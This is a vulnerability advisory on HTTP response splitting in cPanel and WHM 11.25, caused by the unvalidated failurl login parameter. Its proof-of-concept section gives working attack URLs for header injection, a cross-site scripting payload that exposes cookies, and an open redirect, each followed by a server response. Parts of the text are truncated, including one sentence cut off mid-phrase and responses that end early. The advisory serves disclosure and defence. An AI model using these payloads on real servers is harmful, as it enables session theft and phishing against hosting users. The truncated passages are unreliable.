cPanel HTTP Response Splitting Vulnerability
============================================

Vendor
------
cPanel Inc. - http://www.cpanel.net
 
 
Vulnerability Information
-------------------------
Application description:
"cPanel is the industry leader for turning standalone servers into a fully automated point-and-click hosting platform. Tedious tasks are
replaced by web interfaces and API-based calls. cPanel is designed with multiple levels of administration including admin, reseller, end
user, and email-based interfaces. These multiple levels provide security, ease of use, and flexibility for everyone from the server
administrator to the email account user." - cPanel website.
 
Remotely exploitable: Yes
 
Localy exploitable: No
 
Affected versions:
 - cPanel 11.25 build 42174
 - WHM (WebHost Manager) 11.25 build 42174
 * Previous versions may also be affected.
 
 
Vulnerability Details
---------------------
An input validation problem exists within cPanel and WHM versions 11.25 (up to build 42174) which allows injecting CR (carriage return - %0D
or \r) and LF (line feed - %0A or \n) characters into the server HTTP response header, resulting in a HTTP Response Splitting[1]
vulnerability.
The vulnerability exists in the failurl parameter of cPanel login page. In a failed login attempt, the value of failurl returns to the
client in the Location HTTP header.
This vulnerability is possible because the application fails to validate user supplied input to failurl parameter, returning it un-sanitized
within the server HTTP response header back to the client. This vulnerability not only gives attackers control of the remaining headers and
body of the server response, but also allows them to create additional responses entirely under their control.
Attacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing an attacker to steal
cPanel Inc. patched the HTTP Response Splitting vulnerability in the latest versions (build 42213 up to 42483 â€“ latest version) of cPanel
and WHM, but an Open Redirection[2][3] vulnerability still exist (see Disclosure Timeline).
 
 
 
Proof-of-Concept
----------------
Header Injection ("Set-Cookie"):
 
http://server.com:2082/login/?user=foo&pass=bar&failurl=%0D%0ASet-Cookie%3A%20Rec=Sec
 
Server Response:
 
HTTP/1.1 307 Moved
Server: cpsrvd/11.25
Connection: close
Content-length: 105
Location:
Set-Cookie: Rec=Sec
Content-type: text/html
<html><head><META HTTP-EQUIV="refresh" CONTENT="0;URL=
Set-Cookie: Rec=Sec"></head><body></body></html>
 
 
Cross-Site Scripting:
 
http://server.com:2082/login/?user=foo&pass=bar&failurl=%0D%0AContent-Type:%20text/html%0D%0A%0D%0A%3Cscript%3Ealert%28%22Recognize-Security%20-%20%22%2Bdocument.cookie%29;%3C/script%3E%3C!--
 
Server Response:
 
HTTP/1.1 307 Moved
Server: cpsrvd/11.25
Connection: close
Content-length: 206
Location:
Content-Type: text/html

Open Redirection:
 
http://server.com:2082/login/?user=foo&pass=bar&failurl=http://www.rec-sec.com
 
Server Response:
 
HTTP/1.1 307 Moved
